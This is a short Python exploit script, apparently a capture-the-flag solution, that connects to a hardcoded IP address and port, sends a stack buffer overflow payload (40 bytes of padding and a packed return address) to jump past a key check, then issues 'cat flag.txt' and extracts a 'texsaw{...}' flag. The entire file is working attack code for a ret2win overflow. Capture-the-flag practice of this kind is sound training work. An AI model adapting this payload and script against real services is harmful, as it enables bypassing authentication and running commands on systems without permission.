#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time


HOST = "143.198.163.4"
PORT = 15858

# Stack layout in deliver():
# 0x20 bytes buffer + 8 bytes saved RBP = 40 bytes to RIP
OFFSET = 40

# Jump directly into the success path inside drive(), skipping the key check.
WIN = 0x40123A


def recv_some(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except TimeoutError:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def main() -> int:
    payload = b"A" * OFFSET + struct.pack("<Q", WIN) + b"\n"

    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        banner = recv_some(sock, timeout=0.5)
        if banner:
            sys.stdout.write(banner.decode("latin1", errors="replace"))

        sock.sendall(payload)
        time.sleep(0.2)

        response = recv_some(sock, timeout=0.5)
        if response:
            sys.stdout.write(response.decode("latin1", errors="replace"))

        sock.sendall(b"cat flag.txt\n")
        time.sleep(0.2)

        result = recv_some(sock, timeout=1.0)
        text = result.decode("latin1", errors="replace")
        sys.stdout.write(text)

        match = re.search(r"(texsaw\{[^}\n]+\})", text)
        if match:
            print(f"\n[+] Flag: {match.group(1)}")
            return 0

    print("[-] Flag not found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
